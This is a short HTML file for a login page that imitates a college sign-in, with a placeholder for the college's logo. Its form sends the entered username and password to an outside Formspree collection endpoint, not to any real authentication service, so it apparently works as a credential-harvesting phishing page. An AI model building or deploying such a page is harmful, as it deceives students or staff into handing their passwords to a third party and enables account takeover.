<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>

    <style>
        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
            font-family:Arial, sans-serif;
        }

        body{
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            background:#f2f2f2;
        }

        .login-box{
            background:#fff;
            padding:30px;
            border-radius:10px;
            box-shadow:0 0 15px rgba(0,0,0,0.2);
            width:350px;
            text-align:center;
        }

        .login-box img{
            width:100px;
            margin-bottom:20px;
        }

        h2{
            margin-bottom:20px;
            color:#333;
        }

        input{
            width:100%;
            padding:12px;
            margin:10px 0;
            border:1px solid #ccc;
            border-radius:5px;
            font-size:16px;
        }

        button{
            width:100%;
            padding:12px;
            background:#007BFF;
            color:white;
            border:none;
            border-radius:5px;
            font-size:16px;
            cursor:pointer;
        }

        button:hover{
            background:#0056b3;
        }
    </style>
</head>
<body>

    <div class="login-box">

        <!-- Replace logo.png with your college logo -->
        <img src="apec.1.png" alt="College Logo">

        <h2>Login</h2>

        <form action="https://formspree.io/f/xdarprbk" method="POST">

            <input
                type="text"
                name="Username"
                placeholder="Enter Username"
                required
            >

            <input
                type="password"
                name="Password"
                placeholder="Enter Password"
                required
            >

            <button type="submit">Login</button>

        </form>

    </div>

</body>
</html>
